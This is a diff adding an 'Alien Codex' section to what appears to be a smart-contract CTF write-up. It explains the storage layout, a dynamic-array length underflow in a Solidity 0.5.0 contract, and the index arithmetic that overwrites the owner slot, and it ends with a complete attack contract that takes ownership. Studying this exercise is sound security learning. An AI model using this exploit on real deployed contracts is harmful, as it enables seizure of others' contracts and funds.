@@ -21,6 +21,7 @@
 16. [Preservation](#16---preservation)
 17. [Recovery](#17---recovery)
 18. [MagicNumber](#18---magicnumber)
+19. [Alien Codex](#19---alien-codex)
     
 ## 01 - Fallback
 
@@ -539,3 +540,65 @@ and pass the contract's address to the `setSolver` function of the contract chal
 ```js
 await contract.setSolver(contract_address)
 ```
+
+## 19 - Alien Codex
+
+We need to take ownership to solve this challenge.<br/> After inspecting the contract, we see no state of the `owner`. However, the contract inherits the `Ownable` contract which declares a private owner address:
+```sol
+contract AlienCodex is Ownable {
+  bool public contact;
+  bytes32[] public codex;
+
+  ...
+```
+```sol
+contract Ownable {
+   address private _owner;
+
+   ...
+```
+So, we can think the states of the `AlienCodex` as follow:
+```sol
+   address private _owner;
+   bool public contact;
+   bytes32[] public codex;
+```
+The storage layout of the contract is as follows: 
+- `slot 0`: **_owner**(20 bytes) + **contact**(1 byte)
+- `slot 1`: *codex*(**only the length of the array**)
+- Since `codex` state is a dynamic array, the slot of an `index i` will be calculated using the formula: `index_slot = keccak256(1) + index`
+
+The smart contract is written under version `0.5.0`, and we notice a vulnerability of **underflow**:
+```sol
+function retract() contacted public {
+   codex.length--;
+}
+```
+In the beginning, the codex length is 0, after calling the `retract()` function, it will cause an underflow(0 - 1 = 2^256 -1). So, after calling the `retract` function, the length of the `codex` array will be 2^256 -1, which seems **we have complete control of the whole storage of the contract**.<br>
+We know that the owner's address is stored in `slot 0`, and since the `codex` array has full control of the storage, there must be an index of the `codex` array that occupies the `slot 0`. In another words: `slot 0 = keccak256(1) + index`, which gives: `index = -keccak256(1)`. We can easily calculate the index using solidity:
+```sol
+uint256 array_slot = uint256(keccak256(abi.encode(uint256(1))));
+uint256 index = -array_slot;
+```
+After getting the index that occupies the `slot 0`(the slot that contains the owner address), we can simply call the function `revise(uint i, bytes32 _content)`, and pass our address as the *_content* argument, but in a bytes32 format:
+```sol
+ _target.revise(index, bytes32(uint256(uint160(<OUR ADDRESS>))));
+```
+The full Attack contract code to hack the challenge:
+```sol
+contract AlienCodexAttack {
+
+  constructor(AlienCodex _target) public {
+    _target.make_contact();
+    _target.retract();
+
+    uint256 array_slot = uint256(keccak256(abi.encode(uint256(1))));
+    uint256 index = -array_slot;
+    _target.revise(index, bytes32(uint256(uint160(msg.sender))));
+
+    require(_target.owner() == msg.sender, "Attack failed");
+  }
+}
+```
+
+[Attack Contract](./contracts/AlienCodex.sol) | [Test script](./test/AlienCodex.test.js)
